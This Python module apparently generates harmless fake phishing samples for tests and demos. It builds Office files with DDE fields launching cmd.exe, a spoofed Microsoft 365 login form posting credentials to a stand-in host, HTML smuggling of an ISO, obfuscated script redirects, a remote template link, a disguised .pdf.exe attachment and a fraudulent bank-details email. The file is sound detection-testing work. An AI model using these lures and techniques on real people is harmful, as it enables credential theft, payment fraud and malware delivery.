"""Builds realistic (fictional, harmless) attack samples for the tests and for demos.
Every domain is fictional; nothing here runs code."""
import base64
import io
import struct
import zipfile
from email.message import EmailMessage

import qrcode

import cfb_writer


def qr_png(data):
    buf = io.BytesIO()
    qrcode.make(data).convert("RGB").save(buf, "PNG")
    return buf.getvalue()


# --------------------------------------------------------------------- Office
def docx(remote_template=None, hyperlink=None, macro=False, qr=None, unc=None, dde=False, packaged=None):
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
    z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
               '<Default Extension="xml" ContentType="application/xml"/></Types>')
    body = "<w:p><w:r><w:t>Please review the attached remittance advice.</w:t></w:r></w:p>"
    if dde:
        body += '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r></w:p>'
    z.writestr("word/document.xml", f'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>{body}</w:body></w:document>')
    rels = ['<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    if hyperlink:
        rels.append(f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{hyperlink}" TargetMode="External"/>')
    if qr:
        z.writestr("word/media/image1.png", qr_png(qr))
    if unc:
        rels.append(f'<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{unc}" TargetMode="External"/>')
    if packaged:
        z.writestr("word/embeddings/oleObject1.bin", ole_package(*packaged))
    rels.append("</Relationships>")
    z.writestr("word/_rels/document.xml.rels", "".join(rels))
    if remote_template:
        z.writestr("word/_rels/settings.xml.rels",
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   f'<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{remote_template}" TargetMode="External"/></Relationships>')
    if macro:
        z.writestr("word/vbaProject.bin", b"\xD0\xCF\x11\xE0fake-vba")
    z.close()
    return buf.getvalue()


def xlsx_dde():
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w")
    z.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr("xl/workbook.xml", "<workbook/>")
    z.writestr("xl/externalLinks/externalLink1.xml",
               '<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc.exe"/></externalLink>')
    z.close()
    return buf.getvalue()


def ole_package(name, data):
    raw = (struct.pack("<H", 2) + name.encode() + b"\x00" + b"C:\\Temp\\" + name.encode() + b"\x00"
           + struct.pack("<I", 0x00030000) + struct.pack("<I", len(name) + 1) + name.encode() + b"\x00"
           + struct.pack("<I", len(data)) + data)
    raw = struct.pack("<I", len(raw)) + raw
    return cfb_writer.build({"\x01Ole10Native": raw})


def legacy_doc_with_macros():
    return cfb_writer.build({"WordDocument": b"\x00" * 600 + "see https://old-doc-link.top/x".encode("utf-16-le"),
                             "Macros": {"VBA": {"dir": b"\x01" * 40, "ThisDocument": b"Attribute VB_Name"}}})


# ----------------------------------------------------------------- web pages
def html_login_smuggle():
    payload = base64.b64encode(b"MZ" + b"\x00" * 30000).decode()
    return f"""<!DOCTYPE html><html><head><title>Microsoft 365 - Sign in</title></head><body>
<form action="https://m365-portal-signin.top/collect.php" method="post">
<input type="email" name="u" value="c.test@acmeshipping-test.example"><input type="password" name="p"></form>
<script>var d=atob("{payload}");var b=new Blob([d]);var a=document.createElement('a');
a.href=URL.createObjectURL(b);a.download='invoice.iso';a.click();</script></body></html>""".encode()


def html_obfuscated_redirect():
    inner = "window.location.href='https://docs-share-view.top/login'"
    enc = "".join(f"%{b:02x}" for b in inner.encode())
    return f"<html><body><script>eval(unescape('{enc}'))</script></body></html>".encode()


def svg_script():
    return b"""<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="200" height="80">
<text x="10" y="40">Voice message (0:42)</text>
<script>window.location='https://voicemail-m365.top/play?u=c.test@acmeshipping-test.example'</script></svg>"""


# ------------------------------------------------------------------- archives
def zip_of(files, encrypted=False):
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w")
    for n, d in files:
        z.writestr(n, d)
    z.close()
    data = bytearray(buf.getvalue())
    if encrypted:   # set the "encrypted" flag in every local and central header
        i = 0
        while True:
            i = data.find(b"PK\x03\x04", i)
            if i < 0:
                break
            data[i + 6] |= 1
            i += 4
        i = 0
        while True:
            i = data.find(b"PK\x01\x02", i)
            if i < 0:
                break
            data[i + 8] |= 1
            i += 4
    return bytes(data)


def iso_of(files):
    import pycdlib
    iso = pycdlib.PyCdlib()
    iso.new(joliet=3)
    for i, (n, d) in enumerate(files):
        short = f"/F{i}.;1"
        iso.add_fp(io.BytesIO(d), len(d), short, joliet_path="/" + n)
    out = io.BytesIO()
    iso.write_fp(out)
    iso.close()
    return out.getvalue()


FAKE_EXE = b"MZ" + b"\x90" * 200 + b"This program cannot be run in DOS mode"
FAKE_LNK = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 100


# --------------------------------------------------------------------- emails
AUTH_FAIL = ("spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=eurobank-alerts.top; dkim=none (message not signed) "
             "header.d=none;dmarc=fail action=quarantine header.from=eurobank-alerts.top;compauth=fail reason=000")
AUTH_PASS = ("spf=pass (sender IP is 52.100.1.1) smtp.mailfrom=dhl.com; dkim=pass (signature was verified) "
             "header.d=dhl.com;dmarc=pass action=none header.from=dhl.com;compauth=pass reason=100")


def phish_eml():
    m = EmailMessage()
    m["From"] = "Eurobank Security <security@eurobank-alerts.top>"
    m["To"] = "c.test@acmeshipping-test.example"
    m["Reply-To"] = "eurobank.helpdesk@gmail.com"
    m["Subject"] = "Urgent: verify your account before it is suspended"
    m["Date"] = "Fri, 30 Oct 2026 09:12:44 +0200"
    m["Authentication-Results"] = AUTH_FAIL      # the receiving server writes its result ABOVE the delivery line
    m["Received"] = "from mail.eurobank-alerts.top ([185.220.101.44]) by mx.protection.outlook.com"
    m.set_content("Your mailbox will expire today. Verify your account: https://eurobank-gr.secure-login.top/verify")
    m.add_alternative("""<html><body><p>Dear customer, verify your account to avoid suspension.</p>
<p><a href="https://eurobank-gr.secure-login.top/verify?e=c.test%40acmeshipping-test.example">https://www.eurobank.gr/login</a></p>
<p>Or scan: <img src="cid:qr1"></p></body></html>""", subtype="html")
    m.get_payload()[1].add_related(qr_png("https://m365-mfa-verify.sbs/auth"), "image", "png", cid="<qr1>")
    m.add_attachment(FAKE_EXE, maintype="application", subtype="octet-stream", filename="Statement_Oct.pdf.exe")
    m.add_attachment(html_login_smuggle(), maintype="text", subtype="html", filename="Secure_Message.html")
    m.add_attachment(zip_of([("Invoice.docx", docx(remote_template="https://office-templates.top/t.dotm")),
                             ("Payment.lnk", FAKE_LNK)]), maintype="application", subtype="zip", filename="Documents.zip")
    return bytes(m)


def bec_eml():
    m = EmailMessage()
    m["From"] = "Acmeshipping Accounts <accounts@acme-shipping-gr.com>"
    m["To"] = "finance@supplier.example"
    m["Subject"] = "Change of bank details for future payments"
    m["Authentication-Results"] = ("spf=pass smtp.mailfrom=acme-shipping-gr.com; dkim=pass header.d=acme-shipping-gr.com;"
                                   "dmarc=pass action=none header.from=acme-shipping-gr.com;compauth=pass reason=100")
    m.set_content("Dear partner,\nplease note our new bank details for all future payments. IBAN GR16 0110 1250 0000 "
                  "0001 2300 695 has changed, please update your records. Keep this confidential, I'm in a meeting.")
    return bytes(m)


def legit_eml():
    m = EmailMessage()
    m["From"] = "DHL Express <noreply@dhl.com>"
    m["To"] = "c.test@acmeshipping-test.example"
    m["Subject"] = "Your shipment 1234567890 is on its way"
    m["Authentication-Results"] = AUTH_PASS
    m.set_content("Track it here: https://www.dhl.com/gr-en/home/tracking.html?tracking-id=1234567890")
    m.add_alternative('<p>Track: <a href="https://www.dhl.com/gr-en/home/tracking.html?tracking-id=1234567890">'
                      "https://www.dhl.com/gr-en/home/tracking.html</a></p>", subtype="html")
    return bytes(m)


def phish_msg():
    headers = ("From: Microsoft 365 <no-reply@m365-notice.top>\r\nReply-To: it-support.m365@outlook.com\r\n"
               "Authentication-Results: spf=softfail smtp.mailfrom=m365-notice.top; dkim=none; dmarc=none "
               "action=none header.from=m365-notice.top;compauth=fail reason=601\r\n\r\n")
    return cfb_writer.msg("Your password expires today", "Microsoft 365", "no-reply@m365-notice.top",
                          "Your password will expire today. Keep it here: https://m365-password-keep.top/x",
                          html='<a href="https://m365-password-keep.top/x">https://account.microsoft.com</a>',
                          headers=headers,
                          attachments=[("Voicemail.svg", svg_script()), ("Remittance.docm", docx(macro=True))])
